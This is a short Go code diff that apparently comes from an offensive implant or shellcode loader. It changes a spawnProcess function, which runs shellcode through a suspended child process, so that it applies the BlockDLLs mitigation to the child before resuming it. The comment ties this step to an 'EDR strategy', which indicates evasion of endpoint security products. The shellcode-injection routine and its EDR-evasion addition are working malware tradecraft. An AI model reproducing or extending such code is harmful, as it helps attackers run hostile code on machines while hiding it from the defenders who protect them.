@@ -464,6 +464,12 @@ func spawnProcess(targetExe string, shellcode []byte, technique string) string {
 		}
 	}
 
+	// Propagate BlockDLLs hardening into the suspended child before it starts
+	// loading modules (only takes effect when the EDR strategy enables it).
+	if pebBlockDLLs {
+		applyBlockDLLsToChild(hProc)
+	}
+
 	procResumeThread.Call(hThread)
 	procCloseHandle.Call(hThread)
 	procCloseHandle.Call(hProc)
